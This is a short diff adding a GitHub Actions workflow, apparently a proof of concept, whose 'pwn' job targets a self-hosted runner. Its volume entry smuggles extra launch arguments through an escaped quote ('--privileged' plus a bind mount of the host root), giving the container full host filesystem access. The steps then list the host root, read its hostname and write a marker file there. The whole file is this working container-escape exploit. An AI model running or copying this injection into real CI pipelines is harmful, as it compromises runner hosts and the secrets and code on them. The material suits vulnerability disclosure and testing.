@@ -1,0 +1,17 @@
+name: vol-inject
+on: [workflow_dispatch]
+
+jobs:
+  pwn:
+    runs-on: self-hosted
+    container:
+      image: ubuntu:22.04
+      volumes:
+        - '/tmp/vol\" --privileged --mount type=bind,src=/,dst=/host'
+    steps:
+      - name: prove host access
+        run: |
+          id
+          ls /host
+          cat /host/etc/hostname || true
+          touch /host/tmp/runner_poc_$(date +%s)
